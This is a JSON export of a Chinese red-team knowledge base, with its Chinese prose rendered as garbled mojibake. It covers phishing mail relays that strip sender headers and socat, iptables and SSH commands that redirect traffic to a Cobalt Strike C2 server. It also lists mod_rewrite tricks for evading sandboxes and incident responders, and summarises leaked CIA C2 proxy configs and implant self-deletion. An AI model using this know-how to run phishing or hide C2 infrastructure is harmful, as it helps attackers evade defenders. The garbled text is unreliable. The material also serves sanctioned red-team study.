**ç»¿è‰²éƒ¨åˆ†** - æˆ‘ä»¬ä½¿ç”¨äº† curlï¼ˆåŠå…¶é»˜è®¤ UAï¼‰ï¼Œæ ¹æ® .htaccess æ–‡ä»¶ï¼Œå®ƒåº”è¯¥å°†æˆ‘ä»¬é‡å®šå‘åˆ° payloadURLForOtherClients - ä½†å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªæµ‹è¯•ä¸»æœºä¸”ä¸å¯è§£æï¼Œæ‰€ä»¥å¤±è´¥äº†ã€‚\r\n- **ç²‰çº¢è‰²éƒ¨åˆ†** - è¿™æ¬¡ä½¿ç”¨ä¼ªé€ çš„ UAï¼Œå°† http è¯·æ±‚ä¼ªè£…æˆæ¥è‡ª iphone çš„è¯·æ±‚ - æˆ‘ä»¬å¯ä»¥çœ‹åˆ° apache æ­£ç¡®åœ°å°è¯•å°†è¯·æ±‚ä»£ç†åˆ° payloadURLForMobiles ä¸»æœºã€‚\r\n- ![pWlp0D](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/pWlp0D.jpg)\r\n\r\n# 10. Outputs\r\nOutputs.tf åŒ…å«äº†DNS åŠå…¶ IP åœ°å€ï¼Œä¹ŸåŒ…æ‹¬smtpç›¸å…³çš„DKIM DNS TXTç­‰ä¿¡æ¯ï¼š\r\n\r\n- ![w7l8ns](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/w7l8ns.jpg)\r\n- ![JPmM1s](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/JPmM1s.jpg)\r\n# 11. å‚è€ƒèµ„æ–™\r\n- [https://www.ired.team/offensive-security/red-team-infrastructure/automating-red-team-infrastructure-with-terraform#configuring-infrastructure](https://www.ired.team/offensive-security/red-team-infrastructure/automating-red-team-infrastructure-with-terraform#configuring-infrastructure)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red TeamåŸºç¡€è®¾æ–½/é‡å®šå‘å™¨ Redirectors/","title":"é‡å®šå‘å™¨ Redirectors"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: é‡å®šå‘å™¨ Redirectors\r\ntags:\r\n- Red TeamåŸºç¡€è®¾æ–½\r\n- å‘½ä»¤ä¸æ§åˆ¶ C2\r\n- DNS\r\n- SMTP\r\n- Redirector\r\n---\r\n\r\n# 1. SMTP\r\né…ç½®SMTPæ˜¯ä¸ºäº†æ‰§è¡Œå¦‚ä¸‹ä¸¤ä¸ªæ“ä½œï¼š\r\n\r\n- **1. Sendmail**\r\n\r\n  - åˆ æ‰ä¹‹å‰çš„server headersï¼Œåœ¨/etc/mail/sendmail.mcç»“å°¾å¢åŠ ï¼š\r\n\r\n    - ```define(`confRECEIVED_HEADER',`by $j ($v/$Z)$?r with $r$. id $i; $b')dnl```\r\n\r\n  - åœ¨/etc/mail/accessç»“å°¾å¢åŠ ï¼š\r\n\r\n    ```\r\n    IP-to-Team-Server *TAB* RELAY\r\n    Phish-Domain *TAB* RELAY\r\n    ```\r\n\r\n  - å‚è€ƒï¼š\r\n\r\n    - [Removing Senderâ€™s IP Address From Emailâ€™s Received From Header](https://www.devside.net/wamp-server/removing-senders-ip-address-from-emails-received-from-header)\r\n    - [Removing Headers from Postfix setup](https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/)\r\n\r\n  - **catch-all addressï¼š**æŠŠä»»ä½•å‘é€ç»™*@phishdomain.comçš„é‚®ä»¶è½¬å‘åˆ°åˆ°æŒ‡å®šçš„é‚®ä»¶åœ°å€ã€‚\r\n\r\n    - ```echo PHISH-DOMAIN >> /etc/mail/local-host-names```\r\n\r\n  - åœ¨/etc/mail/sendmail.mcçš„//Mailer Definitions//ï¼ˆç»“å°¾å¤„ï¼‰ä¹‹å‰æ·»åŠ ä»¥ä¸‹è¡Œï¼š\r\n\r\n    - ```FEATURE(`virtusertable', `hash -o /etc/mail/virtusertable.db')dnl```\r\n\r\n  - åœ¨/etc/mail/virtusertableç»“å°¾å¢åŠ ï¼š\r\n\r\n    - ```@phishdomain.com  external-relay-address```\r\n\r\n- **2. Postfix**\r\n\r\n  - Postfixæ˜¯æ›¿æ¢Sendmailçš„ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ï¼Œè¿˜æä¾›äº†æ›´å¥½çš„å…¼å®¹æ€§ï¼›Postfixè¿˜æä¾›äº†å…¨é¢çš„IMAPæ”¯æŒï¼Œä½¿å¾—æµ‹è¯•äººå‘˜èƒ½å¤Ÿå®æ—¶åœ°ä¸å¯¹åŸå§‹æ¶ˆæ¯åšå‡ºå“åº”ï¼Œï¼Œè€Œä¸å¿…ä¾é catch-all addressã€‚\r\n  - é…ç½®å‚è€ƒï¼š[Mail Servers Made Easy](https://blog.inspired-sec.com/archive/2017/02/14/Mail-Server-Setup.html)\r\n\r\n# 2. DNS\r\n![X37sEN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/X37sEN.jpg)\r\n\r\n- **Socat**\r\n\r\n  - socatå¯å°†53ç«¯å£ä¸Šçš„DNSæ•°æ®åŒ…é‡å®šå‘åˆ°æˆ‘ä»¬çš„cs team server\r\n    - ```socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<IPADDRESS>; echo -ne```\r\n  - å‚è€ƒï¼š[Redirecting Cobalt Strike DNS Beacons - Steve Borosh](https://medium.com/rvrsh3ll/redirecting-cobalt-strike-dns-beacons-e3dcdb5a8b9b)\r\n\r\n- **iptables**\r\n\r\n  - iptablesè½¬å‘DNSè§„åˆ™å¯ä»¥å’Œæˆ‘ä»¬çš„cs team serveré…åˆä½¿ç”¨\r\n\r\n    ```\r\n    iptables -I INPUT -p udp -m udp --dport 53 -j ACCEPT\r\n    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT \\\r\n    --to-destination <IP-GOES-HERE>:53\r\n    iptables -t nat -A POSTROUTING -j MASQUERADE\r\n    iptables -I FORWARD -j ACCEPT\r\n    iptables -P FORWARD ACCEPT\r\n    sysctl net.ipv4.ip_forward=1\r\n    ```\r\n\r\n- **DNSé‡å®šå‘ä¹Ÿå¯ä»¥åœ¨NATåé¢å®Œæˆ**\r\n\r\n  - æœ‰æ—¶å€™å¯èƒ½éœ€è¦åœ¨æ²¡æœ‰å…¬ç½‘IPçš„å†…éƒ¨ç½‘ç»œä¸Šæ‰˜ç®¡C2æœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨iptablesã€socatå’Œåå‘SSHéš§é“çš„ç»„åˆæ¥å®ç°ã€‚\r\n  - ![4xDzc7](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/4xDzc7.jpg)\r\n\r\n# 3. HTTP(S)\r\n- å®è·µå¯ä»¥å‚è€ƒ [[CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½]]\r\n\r\n- **socat**\r\n\r\n  - socatå¯ç”¨äºå°†æŒ‡å®šç«¯å£ä¸Šçš„ä»»ä½• TCP æ•°æ®åŒ…é‡å®šå‘åˆ°ä½ çš„æœåŠ¡å™¨ã€‚å°†localhostä¸Šçš„ TCP ç«¯å£ 80 é‡å®šå‘åˆ°å¦ä¸€å°ä¸»æœºä¸Šçš„ç«¯å£ 80 çš„åŸºæœ¬è¯­æ³•æ˜¯ï¼š\r\n    - ```socat TCP4-LISTEN:80,fork TCP4:<REMOTE-HOST-IP-ADDRESS>:80```\r\n  - å¦‚æœè¦æŒ‡å®šç½‘ç»œæ¥å£ï¼Œå¯ä»¥ä½¿ç”¨\r\n    - ```socat TCP4-LISTEN:80,bind=10.0.0.2,fork TCP4:1.2.3.4:80```\r\n\r\n- **iptables**\r\n\r\n  - é™¤äº†socat, iptableså¯ä»¥é€šè¿‡ NAT æ‰§è¡Œdumb pipeé‡å®šå‘ã€‚ è¦å°†è½¬å‘å™¨çš„æœ¬åœ°ç«¯å£80è½¬å‘åˆ°è¿œç¨‹ä¸»æœºï¼Œé…ç½®å‘½ä»¤å¦‚ä¸‹ï¼š\r\n\r\n    ```\r\n      iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT\r\n      iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \\\r\n      --to-destination <REMOTE-HOST-IP-ADDRESS>:80\r\n      iptables -t nat -A POSTROUTING -j MASQUERADE\r\n      iptables -I FORWARD -j ACCEPT\r\n      iptables -P FORWARD ACCEPT\r\n      sysctl net.ipv4.ip_forward=1\r\n    ```\r\n\r\n- **SSH**\r\n\r\n  - é¦–å…ˆï¼Œå¿…é¡»è®¾ç½®GatewayPortsè½¬å‘ï¼Œå¦åˆ™å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼š\r\n\r\n    ```\r\n      # Allow the SSH client to specify which hosts may connect\r\n      GatewayPorts yes\r\n      \r\n      # Allow both local and remote port forwards\r\n      AllowTcpForwarding yes\r\n    ```\r\n\r\n  - è¦å°†redirectorçš„æœ¬åœ°ç«¯å£ 80 è½¬å‘åˆ°ä½ çš„å†…éƒ¨æœåŠ¡å™¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\r\n\r\n    ```\r\n      tmux new -S redir80\r\n      ssh <redirector> -R *:80:localhost:80\r\n      Ctrl+B, D\r\n    ```\r\n\r\n  - è¿˜å¯ä»¥è½¬å‘å¤šä¸ªç«¯å£ï¼Œä¾‹å¦‚ï¼ŒåŒæ—¶æ‰“å¼€ 443 å’Œ 80ï¼š\r\n    id:: 624ed011-fe17-47ab-a287-cbab172044be\r\n\r\n    ```\r\n      tmux new -S redir80443\r\n      ssh <redirector> -R *:80:localhost:80 -R *:443:localhost:443\r\n      Ctrl+B, D\r\n    ```\r\n\r\n# 4. Payloads ä¸ Web\r\n- å½“Payloads(æœåŠ¡)å’Œç½‘ç»œèµ„æºå¼€å¯æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›é™ä½è¢«æ£€æµ‹åˆ°çš„é£é™©ï¼ŒåŒæ—¶å¸Œæœ›æ— è®ºæ˜¯å»ºç«‹C2è¿˜æ˜¯æ”¶é›†ä¿¡æ¯payloadéƒ½èƒ½è¢«é«˜æ•ˆçš„æ‰§è¡Œã€‚\r\n- ![ImpMrv](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ImpMrv.jpg)\r\n- ä¸‹é¢æ˜¯ Jeff Dimmock å…³äºApacheçš„mod_rewriteçš„ç”¨æ³•å’Œç¤ºä¾‹ï¼š\r\n  - Strengthen Your Phishing with Apache mod_rewrite https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/\r\n  - Invalid URI Redirection with Apache mod_rewrite https://bluescreenofjeff.com/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/\r\n  - Operating System Based Redirection with Apache mod_rewrite https://bluescreenofjeff.com/2016-04-05-operating-system-based-redirection-with-apache-mod_rewrite/\r\n  - Combatting Incident Responders with Apache mod_rewrite https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/\r\n  - Expire Phishing Links with Apache RewriteMap https://bluescreenofjeff.com/2016-04-19-expire-phishing-links-with-apache-rewritemap/\r\n  - Apache mod_rewrite Grab Bag https://bluescreenofjeff.com/2016-12-23-apache_mod_rewrite_grab_bag/\r\n  - Serving Random Payloads with Apache mod_rewrite https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/\r\n- å…¶ä»–Apacheçš„mod_rewriteçš„ç”¨æ³•å’Œç¤ºä¾‹ï¼š\r\n  - mod_rewrite rule to evade vendor sandboxes from Jason Lang @curi0usjack https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10\r\n  - Serving random payloads with NGINX - Gist by jivoi https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9\r\n- è¦åœ¨redirectorä¸Šè‡ªåŠ¨è®¾ç½®Apacheçš„mod_rewriteï¼Œè¯·çœ‹[Mod_Rewrite Automatic Setup](https://blog.inspired-sec.com/archive/2017/04/17/Mod-Rewrite-Automatic-Setup.html) and [the accompanying tool](https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup)\r\n\r\n# 5. C2é‡å®šå‘\r\n- é‡å®šå‘ C2 æµé‡æœ‰ä¸¤ä¸ªç›®çš„ï¼š1ã€éšè—åç«¯çœŸå®æœåŠ¡å™¨ï¼›2ã€èº²é¿ç›¸å…³çš„è°ƒæŸ¥è€…ï¼Œè®©ä»–ä»¬ä»¥ä¸ºè¿™æ˜¯ä¸ªåˆæ³•ç½‘ç«™ã€‚ é€šè¿‡ä½¿ç”¨Apacheçš„mod_rewriteå’Œè‡ªå®šä¹‰C2é…ç½®æ–‡ä»¶æˆ–å…¶ä»–ä»£ç†ï¼ˆæ¯”å¦‚ä½¿ç”¨Flaskï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é«˜æ•ˆçš„è¿‡æ»¤å‡ºæ¥è‡ªè°ƒæŸ¥ C2 çš„æµé‡ã€‚\r\n\r\n  - Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite - Jeff Dimmock https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/\r\n  - Securing your Empire C2 with Apache mod_rewrite - Gabriel Mathenge (@_theVIVI) https://thevivi.net/2017/11/03/securing-your-empire-c2-with-apache-mod_rewrite/\r\n  - Expand Your Horizon Red Team â€“ Modern SAAS C2 - Alex Rymdeko-Harvey (@killswitch-gui) https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/\r\n  - Hybrid Cobalt Strike Redirectors  https://zachgrace.com/2018/02/20/cobalt_strike_redirectors.html\r\n\r\n- åŸºäºä¸Šè¿° â€œC2é‡å®šå‘â€ï¼Œå¦ä¸€ç§æ–¹æ³•æ˜¯å¯ä»¥åœ¨é‡å®šå‘æœåŠ¡å™¨ä½¿ç”¨Apacheçš„SSLä»£ç†å¼•æ“æ¥æ¥å—å…¥ç«™SSLè¯·æ±‚ï¼Œå¹¶å°†è¿™äº›è¯·æ±‚ä»£ç†åˆ°HTTPS listenerä¸Šã€‚ æ•´ä¸ªé˜¶æ®µä½¿ç”¨SSLåŠ å¯†ï¼Œå¯ä»¥æ ¹æ®éœ€è¦åœ¨redirectorä¸Šè½¬å‘SSLè¯ä¹¦ã€‚\r\n\r\n- å‡å¦‚ä½ å·²ç»ä½¿ç”¨äº†LetsEncryptï¼ˆaka CertBotï¼‰ï¼Œä¸ºäº†ä½¿mod_rewriteè§„åˆ™èƒ½å¤Ÿå·¥ä½œï¼Œéœ€è¦åœ¨â€œ/etc/apache2/sites-available/000-default-le-ssl.confâ€ å®‰è£…é…ç½®è¯ä¹¦ã€‚ å¦å¤–ï¼Œè¦å¯ç”¨SSL ProxyPasså¼•æ“ï¼Œç›¸å…³é…ç½®å¦‚ä¸‹ï¼š\r\n\r\n  ```\r\n    # Enable the Proxy Engine\r\n    SSLProxyEngine On\r\n    \r\n    # Tell the Proxy Engine where to forward your requests\r\n    ProxyPass / https://DESTINATION_C2_URL:443/\r\n    ProxyPassReverse / https://DESTINATION_C2_URL:443/\r\n    \r\n    # Disable Cert checking, useful if you're using a self-signed cert\r\n    SSLProxyCheckPeerCN off\r\n    SSLProxyCheckPeerName off\r\n    SSLProxyCheckPeerExpire off\r\n  ```\r\n\r\n# 6. æ¥æº\r\n- [https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½]: ../å®è·µå‚è€ƒ/CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½.md \"CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/å­¦ä¹ èµ„æº/Northern Kentucky University CSC 482 Computer Security/","title":"Northern Kentucky University CSC 482 Computer Security"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Northern Kentucky University CSC 482 Computer Security\r\ntags:\r\n- å­¦ä¹ èµ„æº\r\n---\r\n\r\n# è¯¾ç¨‹å®‰æ’åŠè¯¾ä»¶\r\n* [https://faculty.cs.nku.edu/~waldenj/classes/2021/fall/csc482/schedule.html](https://faculty.cs.nku.edu/~waldenj/classes/2021/fall/csc482/schedule.html)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/å­¦ä¹ èµ„æº/Stanford University CS 259D Data Mining for Cyber Security/","title":"Stanford University CS 259D Data Mining for Cyber Security"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Stanford University CS 259D Data Mining for Cyber Security\r\ntags:\r\n- å­¦ä¹ èµ„æº\r\n---\r\n\r\n# è¯¾ç¨‹å®‰æ’åŠè¯¾ä»¶\r\n\r\nè¯¾ç¨‹å†…å®¹\r\n\r\n- ä»‹ç»\r\n- åƒµå°¸ç½‘ç»œ\r\n- å†…éƒ¨å¨èƒ\r\n- è¡Œä¸ºç”Ÿç‰©è¯†åˆ«\r\n- **å·¥ä¸šç•Œåˆ†äº«ï¼šå¯Œå›½é“¶è¡Œ**\r\n- ç½‘ç»œå®‰å…¨\r\n- **å·¥ä¸šç•Œåˆ†äº«ï¼šä¸‰è±è”åˆé“¶è¡Œ**\r\n- æœºå™¨å­¦ä¹ å¯¹æŠ—æ€§æ”»å‡»\r\n- å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ\r\n- **å·¥ä¸šç•Œåˆ†äº«ï¼šGoogleå®‰å…¨æ•°æ®æŒ–æ˜**\r\n- å®‰å…¨æœºå™¨å­¦ä¹ \r\n- å¤šæ€æ”»å‡»\r\n- é’“é±¼æ£€æµ‹\r\n- å­¦ç”ŸæŠ¥å‘Š\r\n\r\n- ä½œä¸š\r\n\r\n# æ¥æº\r\n\r\n- [https://web.stanford.edu/class/cs259d/#lectures](https://web.stanford.edu/class/cs259d/#lectures)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/å®è·µå‚è€ƒ/CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½/","title":"CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½\r\ntags:\r\n- å®è·µå‚è€ƒ\r\n- å‘½ä»¤ä¸æ§åˆ¶ C2\r\n- CIA\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\n\r\nâ€‹\tWikileaks æ³„æ¼çš„èµ„æ–™ â€œVault 7: CIA Hacking Tools Revealedâ€ æœ‰æåˆ°CIAæ˜¯æ€ä¹ˆåšçš„ã€‚\r\n\r\n# 2. æ•´ä½“æ¶æ„\r\n\r\n![7VvK67](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/7VvK67.jpg)\r\n\r\nåˆ†ä¸ºäº”ä¸ªéƒ¨åˆ†ï¼š\r\n\r\n- Implanted Host: è¢«æ§åˆ¶çš„æœºå™¨\r\n- VPS Server:  éšæ—¶ä¼šé”€æ¯æ›¿æ¢ï¼Œéšè—çœŸå®C2\r\n- Proxy / VPN Server: ä»£ç†æœåŠ¡å™¨ï¼Œè½¬å‘C2é€šä¿¡æµé‡åˆ°C2æœåŠ¡å™¨\r\n- Backend Server: åå°æœåŠ¡å™¨\r\n- OSN: å­˜å‚¨æ—¥å¿—çš„å®‰å…¨åŒº\r\n\r\nå…¶ä¸­ï¼š\r\n\r\n- Implanted Hoståˆ°VPS Server ä½¿ç”¨VPNè¿æ¥ï¼ˆé€šè¿‡TLSåŠ å¯†ï¼‰\r\n- VPS Serverã€Proxy / VPN Serverã€Backend Serverå’ŒOSNä¹‹é—´çš„é€šä¿¡å…¨éƒ¨ä½¿ç”¨mTLSåŠ å¯†\r\n- æ‰€æœ‰çš„VPS Serveréƒ½æ˜¯å¯¹å…¬ç½‘æä¾›æœåŠ¡çš„æœåŠ¡å™¨ï¼ˆé€šå¸¸æ‰˜ç®¡åœ¨ç©ºå£³å…¬å¸ISPï¼‰\r\n- Proxy / VPN Server ä»£ç†æœåŠ¡å™¨è´Ÿè´£è¿‡æ»¤æ‰â€œæ— æ•ˆâ€æµé‡ï¼ˆå¦‚æœmTLSè®¤è¯å¤±è´¥åˆ™è¿”å›è™šå‡ç½‘ç«™ Cover Serverï¼‰\r\n\r\nVPNå¯èƒ½ä½¿ç”¨çš„æ˜¯OpenVPNï¼Œæ¥è‡ªï¼š\r\n\r\n![821soM](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/821soM.jpg)\r\n\r\næ¶æ„ä¸­çš„Proxy / VPN Server ä»£ç†æœåŠ¡å™¨ä¸ºNginxï¼Œåœ¨ç³»ç»Ÿä¸­è¢«ç§°ä¸ºâ€œSwitchbladeâ€\r\n\r\n# 3. VPS Server\r\n\r\nVPS Serveræ˜¯çº¢é˜ŸåŸºç¡€è®¾æ–½çš„ç¬¬ä¸€é“é˜²çº¿ï¼Œå³ç”¨å³æŠ›å’Œå®‰å…¨å¯é æ˜¯æœ€é‡è¦çš„åŠŸèƒ½ï¼Œå®ƒçš„iptablesé…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼Œä¹Ÿå¯å‚è€ƒ [[é‡å®šå‘å™¨ Redirectors]]\r\n\r\n```\r\n  iptables -P INPUT DROP\r\n  iptables -P FORWARD DROP\r\n  iptables -p OUTPUT DROP\r\n  iptables -A INPUT -p tcp --dport 22 -j ACCEPT\r\n  iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT\r\n  DNAT\r\n  iptables -t nat -A PREROUTING -i eth0 -p tcp --sport 1024:65535 -d 10.3.2.174 --dport 53 -j DNAT --to-destination 172.16.63.101:443\r\n  iptables -t nat -A PREROUTING -i eth0 -p tcp --sport 1024:65535 -d 10.3.2.174 --dport 80 -j DNAT --to-destination 172.16.63.101:443\r\n  iptables -t nat -A PREROUTING -i eth0 -p tcp --sport 1024:65535 -d 10.3.2.174 --dport 443 -j DNAT --to-destination 172.16.63.101:443\r\n  FORWARDING\r\n  iptables -A FORWARD -i eth0 -o p3p2 -m state --state ESTABLISHED,RELATED -j ACCEPT\r\n  iptables -A FORWARD -i p3p2 -o eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT\r\n  iptables -A FORWARD -i eth0 -o p3p2 -p tcp --sport 1024:65535 -d 172.16.63.101 --dport 53 -m state --state NEW -j ACCEPT\r\n  iptables -A FORWARD -i eth0 -o p3p2 -p tcp --sport 1024:65535 -d 172.16.63.101 --dport 80 -m state --state NEW -j ACCEPT\r\n  iptables -A FORWARD -i eth0 -o p3p2 -p tcp --sport 1024:65535 -d 172.16.63.101 --dport 443 -m state --state NEW -j ACCEPT\r\n  SNAT\r\n  iptables -t nat -A POSTROUTING -o p3p2 -j MASQUERADE\r\n```\r\n\r\n# 4. Switchblade\r\n\r\nSwitchbalde æ˜¯ä¸ Hive å’Œ Madison ç­‰å…¶ä»–ä»£ç†æœåŠ¡ä¸€èµ·ä½¿ç”¨çš„èº«ä»½éªŒè¯ä»£ç†æœåŠ¡å™¨ã€‚Switchblade ä½¿ç”¨è‡ªç­¾åå…¬é’¥è¯ä¹¦ä¸ Nginx å’Œ Linux Iptablesç›¸ç»“åˆï¼Œå°†ç»è¿‡èº«ä»½éªŒè¯çš„æ•°æ®ä¼ é€’ç»™C2ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ•°æ®åˆ°è™šå‡ç½‘ç«™ Cover Serverã€‚\r\n\r\næ¶æ„å›¾å¦‚ä¸‹ï¼š\r\n\r\n![fkFu7a](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/fkFu7a.jpg)\r\n\r\næ ¹æ®Wikileaksçš„å¦ä¸€ä»½æ³„æ¼ä¿¡æ¯ [AmazonAtlas](https://wikileaks.org/amazon-atlas/) â€œAmazonæ˜¯ç¾å›½æƒ…æŠ¥ç•Œé¢†å…ˆçš„äº‘æä¾›å•†ã€‚2013 å¹´ï¼ŒAmazonä¸CIAç­¾è®¢äº†ä¸€ä»½ä»·å€¼ 6 äº¿ç¾å…ƒçš„åˆåŒï¼Œä»¥æ„å»ºä¸€ä¸ªäº‘è®¡ç®—ï¼Œä¾›æƒ…æŠ¥æœºæ„ä½¿ç”¨ï¼Œä»¥å¤„ç†è¢«åˆ—ä¸ºç»å¯†çš„ä¿¡æ¯â€ï¼Œå…¶ä¸­å³ä¸‹è§’çš„â€œProtected Operational Network å—ä¿æŠ¤çš„è¿è¥ç½‘ç»œâ€å¯èƒ½æ˜¯AWSæä¾›çš„ä¸“ç”¨ç½‘ç»œåŒºåŸŸã€‚\r\n\r\nSwitchbaldeçš„Nginxé…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š\r\n\r\n```\r\n  # HTTPS server\r\n  server {\r\n          listen          172.16.63.113:443 ssl; \r\n          server_name     nginx.edb.devlan.net;\r\n          ssl_certificate                 /etc/nginx/certs/domainA/server.crt;\r\n          ssl_certificate_key             /etc/nginx/certs/domainA/server.key;\r\n          ssl_client_certificate          /etc/nginx/certs/domainA/ca.crt;\r\n          ssl_verify_client               optional;\r\n          ssl_verify_depth                2;\r\n          ssl_protocols                   TLSv1 TLSv1.1 TLSv1.2;\r\n          ssl_prefer_server_ciphers       on;\r\n                                                                                   \r\n          proxy_set_header        Host    $host:$proxy_port;                       \r\n          location / {                                                              \r\n                  if ($ssl_client_verify = SUCCESS) {                              \r\n                          proxy_pass   http://172.16.64.100:4098;                  \r\n                  }\r\n                  proxy_pass      http://172.16.64.12:44302;\r\n          }\r\n  }\r\n```\r\n\r\n# 5. æµé‡ä¼ªè£…ï¼ˆResignaturingï¼‰\r\n\r\nCIAæ‰¾äº†AFDå¯¹hive 2.5åšäº†ä¸€æ¬¡è¯„æµ‹ï¼Œä»¥éªŒè¯å…¶é€šä¿¡æµé‡æ˜¯å¦ä¼šè¢«å¤–éƒ¨æ£€æµ‹å‡ºæ¥ï¼ŒåŒ…æ‹¬ICMPã€TCPå’ŒUDPç­‰åè®®ï¼ŒCIAä¹Ÿå¯¹è¿™äº›åè®®åšäº†ä¸€äº›ä¿®æ”¹ï¼ˆDNSå’ŒTFTPæ˜æ–‡ä¿¡æ¯å¾ˆå¤šï¼Œæ‰€ä»¥æš‚æœªä¿®æ”¹ï¼‰\r\n\r\n- **ICMP**\r\n  - ![ZKQdsC](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ZKQdsC.jpg)\r\n- AFDå‘ç°å‰6å­—èŠ‚æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„æ£€æµ‹ç‰¹å¾ï¼›é€šè¿‡ç¬¬1ä¸ªå­—èŠ‚çš„keyå¯¹åé¢çš„IPè¿›è¡ŒXORæ··æ·†ï¼ŒCIAå¯¹å…¶è¿›è¡Œäº†ä¿®æ”¹ï¼šXOR keyä¸ºéšæœºå€¼ï¼ˆåç»­ä¼šå˜æˆæ›´é•¿çš„keyï¼‰\r\n- **TCP å’Œ UDP**\r\n  - AFDå¹¶æœªå‘ç°æ˜æ˜¾çš„ç‰¹å¾ï¼Œä½†å‘ç°\r\n    - å­˜åœ¨å›ºå®šçš„9ä¸ªæ•°æ®åŒ…åºåˆ—ï¼Œé•¿åº¦ä¸ºï¼š74-74-66-70-66-466-66-66-54ï¼Œå…¶ä¸­466ä¸ºé€šä¿¡payloadï¼Œå…¶ä½™ä¸ºæ­£å¸¸åè®®çš„é•¿åº¦ã€‚\r\n    - AFDè¿˜æŒ‡å‡ºï¼Œè¿™äº›æ•°æ®åŒ…ä¸ç¬¦åˆå„è‡ªçš„åè®®è§„èŒƒï¼Œå¯èƒ½ä¼šå¼•èµ·æ³¨æ„ã€‚\r\n  - CIAå¯¹æ•°æ®åŒ…è¿›è¡Œäº†å¦‚ä¸‹ä¿®æ”¹ï¼š\r\n    - æ•°æ®åŒ…é•¿åº¦æ˜¯éšæœºçš„\r\n    - TCPå’ŒUDPä½¿ç”¨ç›¸åŒçš„ç¼–ç ç­–ç•¥ï¼Œè§ä¸‹å›¾ï¼š\r\n      - ![gTQnir](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/gTQnir.jpg)\r\n\r\n# 6. è‡ªæ¯æœºåˆ¶ self delete\r\n\r\nç”¨äºç¡®ä¿ä»»ä½•å¤„äºä¼‘çœ çŠ¶æ€çš„ implanted æœºå™¨ï¼ˆæœªæˆåŠŸå¤–è¿C2ï¼‰ï¼Œåœ¨é¢„å®šçš„æ—¶é—´å†…èƒ½æœ‰æ•ˆåœ°è‡ªæ¯ï¼Œå”¯ä¸€æ®‹ä½™çš„ä¸œè¥¿æ˜¯æ˜¯â€œé…ç½®æ–‡ä»¶â€ (.config) å’Œ /var ç›®å½•ä¸­ç•™ä¸‹çš„æ—¥å¿—æ–‡ä»¶ (.log)ã€‚\r\n\r\nåœ¨æ­£å¸¸æ“ä½œæœŸé—´ï¼Œ.log æ–‡ä»¶æ˜¯ç©ºçš„ï¼Œå…¶æœ€åä¿®æ”¹æ—¶é—´è¡¨ç¤ºæœ€åä¸€æ¬¡è”ç³»çš„æ—¶é—´ï¼Œå½“ self-delete æ‰§è¡Œæ—¶ï¼ŒHive äºŒè¿›åˆ¶æ–‡ä»¶å°†ä»ä¸»æœºä¸­åˆ é™¤ï¼Œå¹¶ä½¿ç”¨æ ¼å¼ 